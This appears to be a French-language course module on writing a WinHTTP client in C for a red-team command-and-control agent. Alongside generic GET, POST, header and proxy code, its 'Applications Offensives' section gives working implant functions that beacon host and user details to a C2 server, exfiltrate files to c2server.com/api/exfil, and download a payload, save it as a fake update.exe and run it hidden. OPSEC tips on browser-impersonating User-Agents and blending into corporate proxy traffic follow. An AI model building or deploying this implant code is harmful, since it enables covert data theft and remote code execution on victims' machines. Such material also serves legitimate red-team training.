# Module W45 : HTTP Client WinHTTP

## Objectifs

A la fin de ce module, vous serez capable de :
- Comprendre l'architecture WinHTTP et son fonctionnement
- Créer des requêtes HTTP GET et POST avec WinHTTP
- Gérer les headers HTTP personnalisés
- Configurer et utiliser un proxy
- Implémenter un client HTTP pour communication C2

## Prérequis

- Bases du langage C (pointeurs, structures, gestion mémoire)
- Compréhension du protocole HTTP (requêtes, réponses, headers)
- Utilisation de l'API Windows
- Module W44 (sockets Windows) recommandé

## 1. Architecture WinHTTP

### 1.1 Pourquoi WinHTTP ?

WinHTTP est l'API Windows moderne pour les communications HTTP. Comparé aux sockets bruts, WinHTTP offre :

**Analogie** : Si les sockets sont comme construire une voiture pièce par pièce, WinHTTP est comme acheter une voiture complète prête à rouler.

```
┌─────────────────────────────────────────────┐
│         Application C2 Agent                │
└─────────────────┬───────────────────────────┘
                  │
┌─────────────────▼───────────────────────────┐
│            WinHTTP API                      │
│  ┌──────────┐  ┌──────────┐  ┌──────────┐  │
│  │ Session  │  │ Connect  │  │ Request  │  │
│  └──────────┘  └──────────┘  └──────────┘  │
└─────────────────┬───────────────────────────┘
                  │
┌─────────────────▼───────────────────────────┐
│         WinHTTP.dll (OS)                    │
│  • Gestion automatique TLS/SSL              │
│  • Support proxy natif                      │
│  • Parsing HTTP intégré                     │
└─────────────────┬───────────────────────────┘
                  │
┌─────────────────▼───────────────────────────┐
│         Couche réseau (TCP/IP)              │
└─────────────────────────────────────────────┘
```

Avantages pour Red Team :
- Respect des configurations proxy de l'entreprise (stealth)
- Support HTTPS natif sans bibliothèque supplémentaire
- API Windows légitime (pas de signature suspecte)

### 1.2 Hiérarchie des handles WinHTTP

WinHTTP utilise 3 niveaux de handles :

```
┌──────────────────────────────────────┐
│  HINTERNET hSession                  │  ← WinHttpOpen()
│  (Configuration globale)             │
│  • User-Agent                        │
│  • Proxy settings                    │
└────────────┬─────────────────────────┘
             │
             │ WinHttpConnect()
             ▼
┌──────────────────────────────────────┐
│  HINTERNET hConnect                  │
│  (Connexion à un serveur)            │
│  • Hostname: example.com             │
│  • Port: 80 ou 443                   │
└────────────┬─────────────────────────┘
             │
             │ WinHttpOpenRequest()
             ▼
┌──────────────────────────────────────┐
│  HINTERNET hRequest                  │
│  (Requête HTTP spécifique)           │
│  • Méthode: GET/POST                 │
│  • URI: /api/beacon                  │
│  • Headers                           │
└──────────────────────────────────────┘
```

**Important** : Chaque handle doit être fermé avec `WinHttpCloseHandle()` dans l'ordre inverse de création.

## 2. Requête HTTP GET basique

### 2.1 Flux d'exécution

```
[1] WinHttpOpen()          → Créer session
        ↓
[2] WinHttpConnect()       → Se connecter au serveur
        ↓
[3] WinHttpOpenRequest()   → Préparer requête
        ↓
[4] WinHttpSendRequest()   → Envoyer requête
        ↓
[5] WinHttpReceiveResponse()→ Attendre réponse
        ↓
[6] WinHttpQueryDataAvailable()→ Vérifier données dispo
        ↓
[7] WinHttpReadData()      → Lire les données
        ↓
[8] WinHttpCloseHandle()   → Nettoyer (x3)
```

### 2.2 Code d'implémentation GET

```c
#include <windows.h>
#include <winhttp.h>
#include <stdio.h>

#pragma comment(lib, "winhttp.lib")

BOOL HttpGet(LPCWSTR server, LPCWSTR path, PBYTE* response, DWORD* responseSize) {
    HINTERNET hSession = NULL;
    HINTERNET hConnect = NULL;
    HINTERNET hRequest = NULL;
    BOOL bResults = FALSE;
    DWORD dwSize = 0;
    DWORD dwDownloaded = 0;
    PBYTE pBuffer = NULL;
    DWORD totalSize = 0;

    // [1] Créer session WinHTTP
    hSession = WinHttpOpen(
        L"Mozilla/5.0 (Windows NT 10.0; Win64; x64)",  // User-Agent
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,              // Auto-config proxy
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0
    );

    if (!hSession) {
        printf("[!] WinHttpOpen failed: %d\n", GetLastError());
        return FALSE;
    }

    // [2] Se connecter au serveur
    hConnect = WinHttpConnect(
        hSession,
        server,              // ex: L"example.com"
        INTERNET_DEFAULT_HTTP_PORT,  // 80
        0
    );

    if (!hConnect) {
        printf("[!] WinHttpConnect failed: %d\n", GetLastError());
        goto cleanup;
    }

    // [3] Créer requête HTTP GET
    hRequest = WinHttpOpenRequest(
        hConnect,
        L"GET",              // Méthode HTTP
        path,                // ex: L"/api/data"
        NULL,                // Version HTTP (défaut: HTTP/1.1)
        WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        0                    // Pas de flags (HTTP non sécurisé)
    );

    if (!hRequest) {
        printf("[!] WinHttpOpenRequest failed: %d\n", GetLastError());
        goto cleanup;
    }

    // [4] Envoyer la requête
    bResults = WinHttpSendRequest(
        hRequest,
        WINHTTP_NO_ADDITIONAL_HEADERS,
        0,
        WINHTTP_NO_REQUEST_DATA,
        0,
        0,
        0
    );

    if (!bResults) {
        printf("[!] WinHttpSendRequest failed: %d\n", GetLastError());
        goto cleanup;
    }

    // [5] Recevoir la réponse
    bResults = WinHttpReceiveResponse(hRequest, NULL);

    if (!bResults) {
        printf("[!] WinHttpReceiveResponse failed: %d\n", GetLastError());
        goto cleanup;
    }

    // Vérifier le code de statut HTTP
    DWORD statusCode = 0;
    DWORD statusCodeSize = sizeof(statusCode);
    WinHttpQueryHeaders(
        hRequest,
        WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
        NULL,
        &statusCode,
        &statusCodeSize,
        NULL
    );

    printf("[+] HTTP Status Code: %d\n", statusCode);

    // [6-7] Lire les données par morceaux
    do {
        // Vérifier combien de données sont disponibles
        dwSize = 0;
        if (!WinHttpQueryDataAvailable(hRequest, &dwSize)) {
            printf("[!] WinHttpQueryDataAvailable failed: %d\n", GetLastError());
            break;
        }

        if (dwSize == 0)
            break;  // Plus de données

        // Allouer buffer pour ce morceau
        PBYTE tempBuffer = (PBYTE)malloc(dwSize + 1);
        if (!tempBuffer) {
            printf("[!] Memory allocation failed\n");
            break;
        }

        ZeroMemory(tempBuffer, dwSize + 1);

        // Lire les données
        if (!WinHttpReadData(hRequest, tempBuffer, dwSize, &dwDownloaded)) {
            printf("[!] WinHttpReadData failed: %d\n", GetLastError());
            free(tempBuffer);
            break;
        }

        // Ajouter au buffer global (pour simplification, on accumule)
        PBYTE newBuffer = (PBYTE)realloc(pBuffer, totalSize + dwDownloaded + 1);
        if (!newBuffer) {
            free(tempBuffer);
            break;
        }
        pBuffer = newBuffer;
        memcpy(pBuffer + totalSize, tempBuffer, dwDownloaded);
        totalSize += dwDownloaded;
        pBuffer[totalSize] = '\0';

        free(tempBuffer);

    } while (dwSize > 0);

    *response = pBuffer;
    *responseSize = totalSize;
    bResults = TRUE;

cleanup:
    // [8] Fermer handles dans l'ordre inverse
    if (hRequest) WinHttpCloseHandle(hRequest);
    if (hConnect) WinHttpCloseHandle(hConnect);
    if (hSession) WinHttpCloseHandle(hSession);

    return bResults;
}

int main() {
    PBYTE response = NULL;
    DWORD responseSize = 0;

    if (HttpGet(L"example.com", L"/", &response, &responseSize)) {
        printf("[+] Response received (%d bytes):\n", responseSize);
        printf("%s\n", response);
        free(response);
    } else {
        printf("[!] HTTP GET failed\n");
    }

    return 0;
}
```

### 2.3 Analyse détaillée

**User-Agent** : Toujours utiliser un User-Agent légitime pour se fondre dans le trafic normal :
- `Mozilla/5.0 (Windows NT 10.0; Win64; x64)` : Windows 10 basique
- `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36` : Chrome sur Windows

**Proxy** : `WINHTTP_ACCESS_TYPE_DEFAULT_PROXY` utilise automatiquement les paramètres proxy de Windows.

## 3. Requête HTTP POST avec données

### 3.1 Schéma POST

```
Client (Agent)                    Serveur C2
    │                                 │
    │  POST /api/beacon HTTP/1.1      │
    │  Host: c2server.com             │
    │  Content-Type: application/json │
    │  Content-Length: 45             │
    │                                 │
    │  {"id":"ABC123","status":"ok"}  │
    ├────────────────────────────────►│
    │                                 │
    │         HTTP/1.1 200 OK         │
    │  Content-Type: application/json │
    │                                 │
    │  {"cmd":"shell","args":"whoami"}│
    ◄────────────────────────────────┤
    │                                 │
```

### 3.2 Code HTTP POST

```c
BOOL HttpPost(LPCWSTR server, LPCWSTR path, LPVOID postData, DWORD postDataSize,
              PBYTE* response, DWORD* responseSize) {
    HINTERNET hSession = NULL;
    HINTERNET hConnect = NULL;
    HINTERNET hRequest = NULL;
    BOOL bResults = FALSE;

    hSession = WinHttpOpen(
        L"Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0
    );

    if (!hSession) return FALSE;

    hConnect = WinHttpConnect(hSession, server, INTERNET_DEFAULT_HTTP_PORT, 0);
    if (!hConnect) goto cleanup;

    // Créer requête POST
    hRequest = WinHttpOpenRequest(
        hConnect,
        L"POST",             // Méthode POST
        path,
        NULL,
        WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        0
    );

    if (!hRequest) goto cleanup;

    // Ajouter headers Content-Type
    LPCWSTR headers = L"Content-Type: application/json\r\n";

    bResults = WinHttpSendRequest(
        hRequest,
        headers,             // Headers additionnels
        -1L,                 // wcslen automatique
        postData,            // Corps de la requête
        postDataSize,        // Taille des données
        postDataSize,        // Taille totale
        0
    );

    if (!bResults) goto cleanup;

    // Recevoir réponse (même code que GET)
    bResults = WinHttpReceiveResponse(hRequest, NULL);
    if (!bResults) goto cleanup;

    // Lire réponse (même logique que GET - simplifié ici)
    DWORD dwSize = 0;
    DWORD dwDownloaded = 0;
    PBYTE pBuffer = NULL;
    DWORD totalSize = 0;

    do {
        dwSize = 0;
        if (!WinHttpQueryDataAvailable(hRequest, &dwSize)) break;
        if (dwSize == 0) break;

        PBYTE tempBuffer = (PBYTE)malloc(dwSize + 1);
        if (!tempBuffer) break;

        ZeroMemory(tempBuffer, dwSize + 1);

        if (!WinHttpReadData(hRequest, tempBuffer, dwSize, &dwDownloaded)) {
            free(tempBuffer);
            break;
        }

        PBYTE newBuffer = (PBYTE)realloc(pBuffer, totalSize + dwDownloaded + 1);
        if (!newBuffer) {
            free(tempBuffer);
            break;
        }
        pBuffer = newBuffer;
        memcpy(pBuffer + totalSize, tempBuffer, dwDownloaded);
        totalSize += dwDownloaded;
        pBuffer[totalSize] = '\0';

        free(tempBuffer);

    } while (dwSize > 0);

    *response = pBuffer;
    *responseSize = totalSize;
    bResults = TRUE;

cleanup:
    if (hRequest) WinHttpCloseHandle(hRequest);
    if (hConnect) WinHttpCloseHandle(hConnect);
    if (hSession) WinHttpCloseHandle(hSession);

    return bResults;
}

// Exemple d'utilisation
int main() {
    char postData[] = "{\"id\":\"AGENT001\",\"hostname\":\"DESKTOP-ABC\"}";
    PBYTE response = NULL;
    DWORD responseSize = 0;

    if (HttpPost(L"c2server.com", L"/api/beacon",
                 postData, strlen(postData),
                 &response, &responseSize)) {
        printf("[+] Server response: %s\n", response);
        free(response);
    }

    return 0;
}
```

## 4. Headers HTTP personnalisés

### 4.1 Pourquoi personnaliser les headers ?

Les headers permettent de :
- S'authentifier auprès du C2 (API key, Bearer token)
- Se faire passer pour une application légitime
- Contourner des protections basiques (User-Agent filtering)

```
GET /api/data HTTP/1.1
Host: c2server.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: application/json
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
X-Custom-Header: MaliciousValue
```

### 4.2 Ajout de headers

```c
BOOL HttpGetWithHeaders(LPCWSTR server, LPCWSTR path, LPCWSTR customHeaders) {
    HINTERNET hSession, hConnect, hRequest;
    BOOL bResults = FALSE;

    hSession = WinHttpOpen(L"CustomUserAgent/1.0",
                           WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                           WINHTTP_NO_PROXY_NAME,
                           WINHTTP_NO_PROXY_BYPASS, 0);

    hConnect = WinHttpConnect(hSession, server, INTERNET_DEFAULT_HTTP_PORT, 0);
    hRequest = WinHttpOpenRequest(hConnect, L"GET", path, NULL,
                                  WINHTTP_NO_REFERER,
                                  WINHTTP_DEFAULT_ACCEPT_TYPES, 0);

    // Méthode 1: Headers dans WinHttpSendRequest
    bResults = WinHttpSendRequest(
        hRequest,
        customHeaders,       // Ex: L"Authorization: Bearer ABC123\r\nX-API-Key: secret\r\n"
        -1L,
        WINHTTP_NO_REQUEST_DATA,
        0, 0, 0
    );

    // OU Méthode 2: WinHttpAddRequestHeaders
    /*
    WinHttpAddRequestHeaders(
        hRequest,
        customHeaders,
        -1L,
        WINHTTP_ADDREQ_FLAG_ADD  // Ajouter le header
    );
    bResults = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS,
                                  0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
    */

    if (bResults) {
        bResults = WinHttpReceiveResponse(hRequest, NULL);
        // ... traiter réponse
    }

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    return bResults;
}
```

### 4.3 Headers fréquents pour C2

```c
// Authentification Bearer Token
L"Authorization: Bearer eyJhbGciOiJIUzI1NiI...\r\n"

// API Key personnalisée
L"X-API-Key: 4f8a9c2e1d3b7a6f\r\n"

// Simuler un client JSON
L"Accept: application/json\r\nContent-Type: application/json\r\n"

// Cookie de session
L"Cookie: sessionid=abc123; token=xyz789\r\n"

// Referer pour simuler navigation légitime
L"Referer: https://www.google.com/\r\n"
```

## 5. Configuration proxy

### 5.1 Types de configuration proxy

```
┌──────────────────────────────────────────┐
│  Configuration Proxy Windows             │
├──────────────────────────────────────────┤
│                                          │
│  [1] Pas de proxy (direct)               │
│      └─ WINHTTP_ACCESS_TYPE_NO_PROXY     │
│                                          │
│  [2] Proxy système (auto-config)         │
│      └─ WINHTTP_ACCESS_TYPE_DEFAULT_PROXY│
│      └─ Utilise IE/Windows settings      │
│                                          │
│  [3] Proxy manuel                        │
│      └─ WINHTTP_ACCESS_TYPE_NAMED_PROXY  │
│      └─ Spécifier proxy:port             │
│                                          │
│  [4] Auto-découverte (WPAD)              │
│      └─ WinHttpGetProxyForUrl()          │
│      └─ Détection automatique réseau     │
│                                          │
└──────────────────────────────────────────┘
```

### 5.2 Proxy manuel

```c
BOOL HttpGetViaProxy(LPCWSTR server, LPCWSTR path, LPCWSTR proxyServer) {
    HINTERNET hSession, hConnect, hRequest;

    // Créer session avec proxy spécifique
    hSession = WinHttpOpen(
        L"Mozilla/5.0",
        WINHTTP_ACCESS_TYPE_NAMED_PROXY,  // Utiliser proxy nommé
        proxyServer,                       // Ex: L"proxy.corp.com:8080"
        WINHTTP_NO_PROXY_BYPASS,
        0
    );

    if (!hSession) {
        printf("[!] WinHttpOpen failed: %d\n", GetLastError());
        return FALSE;
    }

    hConnect = WinHttpConnect(hSession, server, INTERNET_DEFAULT_HTTP_PORT, 0);
    hRequest = WinHttpOpenRequest(hConnect, L"GET", path, NULL,
                                  WINHTTP_NO_REFERER,
                                  WINHTTP_DEFAULT_ACCEPT_TYPES, 0);

    // Si proxy nécessite authentification
    WinHttpSetCredentials(
        hRequest,
        WINHTTP_AUTH_TARGET_PROXY,
        WINHTTP_AUTH_SCHEME_BASIC,
        L"username",
        L"password",
        NULL
    );

    BOOL bResults = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS,
                                       0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);

    if (bResults) {
        WinHttpReceiveResponse(hRequest, NULL);
        // ... lire réponse
    }

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    return bResults;
}
```

### 5.3 Auto-détection proxy (WPAD)

```c
BOOL HttpGetWithAutoProxy(LPCWSTR server, LPCWSTR path) {
    HINTERNET hSession, hConnect, hRequest;
    WINHTTP_AUTOPROXY_OPTIONS autoProxyOptions;
    WINHTTP_PROXY_INFO proxyInfo;
    BOOL bResults = FALSE;

    // Session sans proxy initialement
    hSession = WinHttpOpen(L"Mozilla/5.0",
                           WINHTTP_ACCESS_TYPE_NO_PROXY,
                           WINHTTP_NO_PROXY_NAME,
                           WINHTTP_NO_PROXY_BYPASS, 0);

    hConnect = WinHttpConnect(hSession, server, INTERNET_DEFAULT_HTTP_PORT, 0);
    hRequest = WinHttpOpenRequest(hConnect, L"GET", path, NULL,
                                  WINHTTP_NO_REFERER,
                                  WINHTTP_DEFAULT_ACCEPT_TYPES, 0);

    // Construire URL complète pour détection proxy
    WCHAR fullUrl[256];
    swprintf(fullUrl, 256, L"http://%s%s", server, path);

    // Configuration auto-proxy
    ZeroMemory(&autoProxyOptions, sizeof(autoProxyOptions));
    autoProxyOptions.dwFlags = WINHTTP_AUTOPROXY_AUTO_DETECT;
    autoProxyOptions.dwAutoDetectFlags = WINHTTP_AUTO_DETECT_TYPE_DHCP |
                                         WINHTTP_AUTO_DETECT_TYPE_DNS_A;
    autoProxyOptions.fAutoLogonIfChallenged = TRUE;

    // Détecter le proxy pour cette URL
    if (WinHttpGetProxyForUrl(hSession, fullUrl, &autoProxyOptions, &proxyInfo)) {
        printf("[+] Proxy detected: %S\n", proxyInfo.lpszProxy);

        // Appliquer configuration proxy à la requête
        WinHttpSetOption(hRequest, WINHTTP_OPTION_PROXY, &proxyInfo, sizeof(proxyInfo));

        // Libérer mémoire allouée par WinHttpGetProxyForUrl
        if (proxyInfo.lpszProxy) GlobalFree(proxyInfo.lpszProxy);
        if (proxyInfo.lpszProxyBypass) GlobalFree(proxyInfo.lpszProxyBypass);
    } else {
        printf("[*] No proxy detected, using direct connection\n");
    }

    // Envoyer requête
    bResults = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS,
                                  0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);

    if (bResults) {
        WinHttpReceiveResponse(hRequest, NULL);
        // ... lire réponse
    }

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    return bResults;
}
```

## 6. Applications Offensives

### 6.1 Beacon HTTP classique

```c
// Structure de données beacon
typedef struct {
    char agentId[64];
    char hostname[128];
    char username[128];
    DWORD pid;
} BEACON_CHECKIN;

BOOL BeaconCheckIn(LPCWSTR c2Server, BEACON_CHECKIN* beaconData) {
    // Construire JSON manuellement (ou utiliser bibliothèque)
    char jsonPayload[512];
    sprintf(jsonPayload,
            "{\"id\":\"%s\",\"hostname\":\"%s\",\"user\":\"%s\",\"pid\":%d}",
            beaconData->agentId,
            beaconData->hostname,
            beaconData->username,
            beaconData->pid);

    PBYTE response = NULL;
    DWORD responseSize = 0;

    BOOL result = HttpPost(
        c2Server,
        L"/api/beacon/checkin",
        jsonPayload,
        strlen(jsonPayload),
        &response,
        &responseSize
    );

    if (result) {
        printf("[+] Beacon check-in successful\n");
        printf("[+] Server response: %s\n", response);
        free(response);
    }

    return result;
}
```

### 6.2 Exfiltration de données

```c
BOOL ExfiltrateFile(LPCWSTR c2Server, LPCSTR filePath) {
    // Lire fichier en mémoire
    HANDLE hFile = CreateFileA(filePath, GENERIC_READ, FILE_SHARE_READ,
                               NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return FALSE;

    DWORD fileSize = GetFileSize(hFile, NULL);
    PBYTE fileData = (PBYTE)malloc(fileSize);
    DWORD bytesRead = 0;

    ReadFile(hFile, fileData, fileSize, &bytesRead, NULL);
    CloseHandle(hFile);

    // Encoder en Base64 (fonction custom ou bibliothèque)
    // char* base64Data = Base64Encode(fileData, fileSize);

    // Construire payload JSON
    char jsonPayload[8192];
    sprintf(jsonPayload,
            "{\"filename\":\"%s\",\"size\":%d,\"data\":\"%s\"}",
            filePath, fileSize, "BASE64_DATA_HERE");

    PBYTE response = NULL;
    DWORD responseSize = 0;

    BOOL result = HttpPost(c2Server, L"/api/exfil",
                           jsonPayload, strlen(jsonPayload),
                           &response, &responseSize);

    free(fileData);
    if (response) free(response);

    return result;
}
```

### 6.3 Téléchargement de payload

```c
BOOL DownloadAndExecute(LPCWSTR c2Server, LPCWSTR payloadPath) {
    PBYTE payload = NULL;
    DWORD payloadSize = 0;

    // Télécharger payload depuis C2
    if (!HttpGet(c2Server, payloadPath, &payload, &payloadSize)) {
        return FALSE;
    }

    printf("[+] Downloaded %d bytes\n", payloadSize);

    // Sauvegarder temporairement (ou exécuter directement en mémoire)
    HANDLE hFile = CreateFileA("C:\\Windows\\Temp\\update.exe",
                               GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
                               FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile != INVALID_HANDLE_VALUE) {
        DWORD bytesWritten;
        WriteFile(hFile, payload, payloadSize, &bytesWritten, NULL);
        CloseHandle(hFile);

        // Exécuter
        WinExec("C:\\Windows\\Temp\\update.exe", SW_HIDE);
    }

    free(payload);
    return TRUE;
}
```

## 7. Considérations OPSEC

### 7.1 Fingerprinting et détection

**Problèmes potentiels** :
```
[X] User-Agent générique ou suspect
    → Utiliser User-Agent légitime et courant

[X] Patterns de timing réguliers
    → Ajouter jitter (voir module W55)

[X] Toujours même endpoint
    → Varier les URIs (/search, /api, /images)

[X] Pas de validation certificat HTTPS
    → Active SSL pinning (module W46)

[X] Headers HTTP manquants
    → Accept, Accept-Language, Accept-Encoding
```

### 7.2 User-Agent realiste

```c
// Base de données User-Agents légitimes
const LPCWSTR UserAgents[] = {
    L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    L"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
};

// Sélectionner aléatoirement
LPCWSTR GetRandomUserAgent() {
    srand(time(NULL));
    int index = rand() % (sizeof(UserAgents) / sizeof(UserAgents[0]));
    return UserAgents[index];
}
```

### 7.3 Respect des proxies d'entreprise

**Pourquoi important ?** : Les entreprises forcent souvent le trafic HTTP/HTTPS via un proxy corporatif. Contourner ce proxy est suspect.

```c
// Toujours essayer auto-config en premier
hSession = WinHttpOpen(
    GetRandomUserAgent(),
    WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,  // Respecte config Windows
    WINHTTP_NO_PROXY_NAME,
    WINHTTP_NO_PROXY_BYPASS,
    0
);
```

### 7.4 Nettoyage mémoire

```c
// Toujours nettoyer les données sensibles en mémoire
void SecureCleanup(PBYTE buffer, DWORD size) {
    if (buffer) {
        SecureZeroMemory(buffer, size);  // Empêche optimisation compilateur
        free(buffer);
    }
}
```

## 8. Checklist d'implémentation

- [ ] WinHTTP session créée avec User-Agent légitime
- [ ] Support proxy automatique (DEFAULT_PROXY)
- [ ] Gestion erreurs complète (codes retour, GetLastError)
- [ ] Vérification code HTTP status (200, 404, 500...)
- [ ] Lecture réponse par chunks (WinHttpQueryDataAvailable)
- [ ] Fermeture handles dans l'ordre inverse
- [ ] Headers HTTP réalistes (Accept, Content-Type)
- [ ] Pas de hardcoded credentials dans le code
- [ ] Timeout configurés (WinHttpSetTimeouts)
- [ ] Nettoyage mémoire sécurisé

## 9. Compilation et test

### 9.1 Compiler

```bash
# Avec cl.exe (Visual Studio)
cl.exe /O2 http_client.c /link winhttp.lib

# Avec MinGW
gcc http_client.c -o http_client.exe -lwinhttp -O2
```

### 9.2 Test basique

```c
int main() {
    PBYTE response = NULL;
    DWORD responseSize = 0;

    // Test GET simple
    if (HttpGet(L"www.example.com", L"/", &response, &responseSize)) {
        printf("[+] GET Success: %d bytes\n", responseSize);
        free(response);
    }

    // Test POST
    char postData[] = "{\"test\":\"data\"}";
    if (HttpPost(L"httpbin.org", L"/post",
                 postData, strlen(postData),
                 &response, &responseSize)) {
        printf("[+] POST Success: %s\n", response);
        free(response);
    }

    return 0;
}
```

## Exercices

Voir [exercice.md](exercice.md) pour :
- Implémenter client HTTP GET/POST complet
- Ajouter support proxy manuel
- Créer fonction beacon check-in
- Gérer timeouts et retry logic

## Ressources complémentaires

- [Microsoft WinHTTP Documentation](https://docs.microsoft.com/en-us/windows/win32/winhttp/winhttp-start-page)
- [WinHTTP vs WinInet comparison](https://docs.microsoft.com/en-us/windows/win32/winhttp/winhttp-vs-wininet)
- HTTP/1.1 RFC 2616
- [MITRE ATT&CK T1071.001](https://attack.mitre.org/techniques/T1071/001/) - Application Layer Protocol: Web Protocols

---

**Navigation**
- [Module précédent](../00-Reverse-Shell/)
- [Module suivant](../02-HTTPS-Communication/)
